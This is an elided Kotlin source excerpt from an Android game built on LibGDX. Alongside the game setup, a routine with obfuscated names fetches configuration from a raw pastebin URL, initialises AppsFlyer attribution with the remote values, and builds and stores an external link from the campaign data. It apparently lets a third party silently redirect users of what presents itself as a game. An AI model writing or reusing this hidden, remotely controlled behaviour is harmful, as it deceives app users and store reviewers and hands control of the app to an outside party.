...
import com.frusune.abvger.game.dataStore.ContributionUtil
import com.frusune.abvger.game.manager.*
import com.frusune.abvger.game.manager.util.MusicUtil
import com.frusune.abvger.game.manager.util.SoundUtil
import com.frusune.abvger.game.manager.util.SpriteUtil
import com.frusune.abvger.game.screens.SplashScreen
import com.frusune.abvger.game.utils.GColor
import com.frusune.abvger.game.utils.advanced.AdvancedGame
import com.frusune.abvger.game.utils.disposeAll
...
class LibGDXGame(val activity: GameActivity) : AdvancedGame() {
    ...
    var backgroundColor = GColor.red
    ...
    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("Afine", MODE_PRIVATE)
    ...
    private fun afine() {
        ...
        val capitalism = sharedPreferences.getString("abv", "zero") ?: "zero"
        ...
        try {
            if (capitalism == "zero") {
                coroutine.launch(Dispatchers.Main) {
                    ...
                    if (getJSON != null) {
                        AppsFlyerLib.getInstance().init(getJSON.krot, getAppsFlyerConversionListener(getJSON.abe), appContext)
                        AppsFlyerLib.getInstance().start(activity, getJSON.krot, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
    ...
    private suspend fun requestGet() = CompletableDeferred<GetJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/0rYZ1DPG"
        ...
        try {
            ...
            if (responseCode == HttpURLConnection.HTTP_OK) {
                ...
                val getJSON = GetJSON(
                    abe  = jsonResponse.getString("abe")  ?: "",
                    krot = jsonResponse.getString("krot") ?: "",
                )
    ...
    private data class GetJSON(val abe: String, val krot: String)
    ...
    private fun getAppsFlyerConversionListener(domino: String) = object : AppsFlyerConversionListener {
        ...
        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            ...
            if (appfMap != null) {
                ...
                val link = "$domino?sdfhjs=$campaign&qwopsa=$afAd&dvjik=$media"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("abv", link).apply() }
